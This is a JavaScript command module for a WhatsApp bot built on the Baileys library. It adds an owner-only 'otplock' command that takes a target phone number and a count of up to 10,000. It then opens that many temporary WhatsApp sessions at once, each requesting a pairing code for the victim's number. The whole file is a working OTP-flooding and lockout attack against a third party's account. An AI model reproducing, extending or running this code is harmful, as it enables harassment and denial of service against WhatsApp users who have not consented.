const { default: makeWASocket, useMultiFileAuthState, fetchLatestBaileysVersion, Browsers } = require('@whiskeysockets/baileys')
const pino = require('pino')
const fs = require('fs')
const path = require('path')

module.exports = function registerOtplockCommand({ registerCommand }) {
  registerCommand('otplock', 'Request pairing code multiple times', async (sock, msg, args) => {
    const jid = msg.key.remoteJid
    const senderJid = msg.key.participant || msg.key.remoteJid
    const normalizedOwner = String(process.env.OWNER_NUMBER || '').replace(/[^0-9]/g, '')
    const normalizedSender = senderJid.split('@')[0].replace(/[^0-9]/g, '')
    const isOwner = normalizedSender === normalizedOwner || senderJid.includes(normalizedOwner) || msg.key.fromMe
    if (!isOwner) { await sock.sendMessage(jid, { text: '❌ Owner only.' }); return }

    const num = (args[0] || '').replace(/[^0-9]/g, '')
    const amt = Math.min(Math.max(parseInt(args[1] || '1'), 1), 10000)
    const prefix = process.env.PREFIX || '.'
    if (!num) { await sock.sendMessage(jid, { text: `💡 Usage: ${prefix}otplock <number> <count>` }); return }

  const attempts = []
  let successCount = 0
  let failCount = 0
  
  for (let i = 0; i < amt; i++) {
    attempts.push((async () => {
      const tmp = path.join(__dirname, '..', 'tmp', `otplock_${Date.now()}_${Math.random().toString(36).slice(2,8)}_${i}`)
      try { fs.mkdirSync(tmp, { recursive: true }) } catch {}
      try {
        const { state } = await useMultiFileAuthState(tmp)
        const { version } = await fetchLatestBaileysVersion()
        const s = makeWASocket({
          logger: pino({ level: 'silent' }),
          auth: state,
          version,
          browser: Browsers.appropriate('Chrome'),
          printQRInTerminal: false,
          defaultQueryTimeoutMs: 60000,
          keepAliveIntervalMs: 45000,
          markOnlineOnConnect: false,
          syncFullHistory: false,
        })
        await new Promise((resolve, reject) => {
          let done = false
          let requested = false
          const timer = setTimeout(() => { if (!done) { done = true; reject(new Error('timeout')) } }, 60000)
          s.ev.on('connection.update', async (u) => {
            if (done) return
            const { qr } = u || {}
            if (qr && !requested && !s.authState.creds.registered) {
              requested = true
              try {
                await s.requestPairingCode(num)
                clearTimeout(timer)
                setTimeout(() => { if (!done) { done = true; resolve() } }, 60000)
              }
              catch (e) { done = true; clearTimeout(timer); reject(e) }
            }
          })
        })
        successCount++
        try { s.end && s.end() } catch {}
        } catch (e) { failCount++ }
        try { fs.rmSync(tmp, { recursive: true, force: true }) } catch {}
      })())
    }
    await Promise.allSettled(attempts)
    const summary = `✅ Requested pairing code x${successCount} / ${amt} for ${num}${failCount ? `\n⚠️ Failed: ${failCount}` : ''}`
    await sock.sendMessage(jid, { text: summary })
  })
}